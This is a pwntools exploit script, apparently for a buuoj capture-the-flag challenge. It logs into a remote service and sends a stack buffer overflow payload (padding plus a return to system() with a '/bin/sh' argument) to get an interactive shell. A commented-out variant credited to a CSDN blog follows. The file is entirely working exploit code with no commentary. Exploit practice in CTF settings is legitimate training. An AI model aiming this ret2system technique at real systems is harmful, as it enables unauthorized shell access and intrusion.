from pwn import *

context.os = "linux"
context.arch = "i386"
# context.log_level = "debug"

systemAddr = 0x80484d0
shStr = 0x80482ea

p = remote("node4.buuoj.cn", 26541)

p.sendlineafter("password:", b'administrator')

# 调用AddLog()
p.sendlineafter("Exit\n:", b'1')

# 写入
payload = b'a'*(0x48+4)+p32(systemAddr)+p32(0xdeadbeef)+p32(shStr)
p.sendlineafter("log info:", payload)

# 调用GetFlag()
p.sendlineafter("Exit\n:", b'4')


p.interactive()


# == from csdn https://blog.csdn.net/qq_41560595/article/details/118860263 ==
# p.recvuntil(":")
# p.sendline("administrator")

# p.recvuntil(":")
# p.sendline("1")

# system=0x80484D0
# sh=0x080482ea

# payload=b"A"*(0x4c)+p32(system)+b"0000"+p32(sh)

# p.sendline(payload)
# p.recvuntil(":")
# p.sendline("4")
# p.interactive()
